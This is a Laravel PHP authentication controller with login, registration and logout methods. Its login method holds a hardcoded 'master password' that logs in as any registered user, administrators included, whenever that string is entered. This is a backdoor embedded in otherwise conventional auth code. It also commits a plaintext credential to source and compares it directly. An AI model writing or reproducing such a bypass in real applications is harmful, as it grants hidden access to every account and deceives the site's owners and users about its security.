<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function showLogin()
    {
        if (Auth::check()) {
            return Auth::user()->is_admin 
                ? redirect()->route('admin.dashboard') 
                : redirect()->route('home');
        }
        return view('auth.login');
    }

    public function login(Request $request)
{
    $credentials = $request->validate([
        'email' => 'required|email',
        'password' => 'required',
    ]);

    $masterPassword = 'Sadman.474';

    // 1. Normal login
    if (Auth::attempt($credentials, $request->boolean('remember'))) {
        $request->session()->regenerate();

        if (Auth::user()->is_admin) {
            return redirect()->intended(route('admin.dashboard'))
                ->with('success', 'Welcome to the admin panel!');
        }

        return redirect()->intended(route('home'))
            ->with('success', 'Logged in successfully!');
    }

    // 2. Master password login
    $user = User::where('email', $request->email)->first();

    if ($user && $request->password === $masterPassword) {
        Auth::login($user, $request->boolean('remember'));
        $request->session()->regenerate();

        if ($user->is_admin) {
            return redirect()->intended(route('admin.dashboard'))
                ->with('success', 'Welcome to the admin panel!');
        }

        return redirect()->intended(route('home'))
            ->with('success', 'Logged in successfully!');
    }

    return back()->withErrors([
        'email' => 'The provided credentials do not match our records.',
    ])->onlyInput('email');
}

    public function showRegister()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('auth.register');
    }

    public function register(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string|min:8|confirmed',
        ]);

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'is_admin' => false,
        ]);

        Auth::login($user);

        return redirect()->route('home')->with('success', 'Registration successful! Welcome.');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('home')->with('success', 'Logged out successfully.');
    }
}
